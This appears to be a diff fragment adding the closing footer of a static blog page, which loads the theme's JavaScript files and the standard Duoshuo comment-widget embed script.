+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
